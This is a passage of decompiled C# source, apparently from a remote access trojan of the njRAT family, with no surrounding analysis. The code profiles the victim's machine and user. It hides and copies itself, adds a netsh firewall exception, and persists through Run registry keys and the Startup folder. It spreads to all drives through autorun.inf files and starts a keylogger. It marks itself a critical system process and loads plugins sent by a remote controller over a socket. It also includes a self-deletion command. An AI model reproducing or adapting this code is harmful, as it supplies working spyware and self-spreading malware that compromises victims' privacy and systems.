				if ((array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0))) ? true : false)
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex9.Message);
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
		}
		text = text + "" + Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + VR + Y + ".." + Y + ACT() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public static void INS()
	{
		Thread.Sleep(1000);
		if ((Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower()))) ? true : false)
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				File.Copy(LO.FullName, Interaction.Environ(DR) + "\\" + EXE, overwrite: true);
				Process.Start(Interaction.Environ(DR) + "\\" + EXE);
				ProjectData.EndApp();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.get_Name() + "\" ENABLE", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Isu)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (IsF)
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
				FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (anti2)
		{
			Interaction.Shell("taskkill /F /IM " + anti, (AppWinStyle)0, false, -1);
		}
		if (HD)
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (!usb)
		{
			return;
		}
		string text = "autorun.inf";
		string text2 = usbx;
		FileAttributes fileAttributes = FileAttributes.Hidden;
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				File.Copy(Application.get_ExecutablePath(), programFiles + text2);
				File.SetAttributes(programFiles + text2, fileAttributes);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				StreamWriter streamWriter = new StreamWriter(programFiles + "\\" + text);
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open=" + programFiles + text2);
				streamWriter.WriteLine("shellexecute=" + programFiles, 1);
				streamWriter.Close();
				File.SetAttributes(programFiles + text, fileAttributes);
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ko()
	{
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Expected O, but got Unknown
		if (Interaction.Command() != null)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
		bool createdNew = false;
		MT = new Mutex(initiallyOwned: true, RG, out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		INS();
		if (!Idr)
		{
			EXE = LO.get_Name();
			DR = LO.Directory!.get_Name();
		}
		Thread thread = new Thread(RC, 1);
		thread.Start();
		try
		{
			kq = new kl();
			Thread thread2 = new Thread(kq.WRK, 1);
			thread2.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (task)
		{
			mgr mgr2 = new mgr();
			Thread thread3 = new Thread(mgr2.protect);
			thread3.Start();
		}
		int num = 0;
		string text = "";
		if (BD)
		{
			try
			{
				SystemEvents.add_SessionEnding(new SessionEndingEventHandler(im));
				pr(1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		while (true)
		{
			Thread.Sleep(1000);
			if (!Cn)
			{
				text = "";
			}
			Application.DoEvents();
			try
			{
				num = checked(num + 1);
				if (num == 5)
				{
					try
					{
						Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				if (num >= 8)
				{
					num = 0;
					string text2 = ACT();
					if (Operators.CompareString(text, text2, false) != 0)
					{
						text = text2;
						Send("act" + Y + text2);
					}
				}
				if (!Isu)
				{
					continue;
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_LocalMachine().GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string md5(byte[] B)
	{
		B = new MD5CryptoServiceProvider().ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		checked
		{
			int num = modules.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				Module module = modules[num2];
				Type[] types = module.GetTypes();
				int num5 = types.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					Type type = types[num6];
					if (!type.FullName!.EndsWith("." + c))
					{
						num6++;
						continue;
					}
					return module.Assembly.CreateInstance(type.FullName);
				}
				num2++;
			}
			return null;
		}
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (C != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0270:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (C.Available < 1)
							{
								C.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (C.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = C.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (C.Available > 0)
											{
												goto IL_016f;
											}
											goto IL_0270;
										case -1:
											goto end_IL_0100;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_0100:
										break;
									}
									break;
								}
								b = new byte[C.Available + 1 - 1 + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
								}
								int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(im, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_0270;
								IL_016f:;
							}
							break;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			FileInfo lO = LO;
			lock (lO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (Cn)
				{
					Cn = false;
					C.Close();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void UNS()
	{
		pr(0);
		Isu = false;
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (FS != null)
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
				FS.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
			Interaction.Shell("cmd.exe /k ping 0 & del \"" + LO.FullName + "\" & exit", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
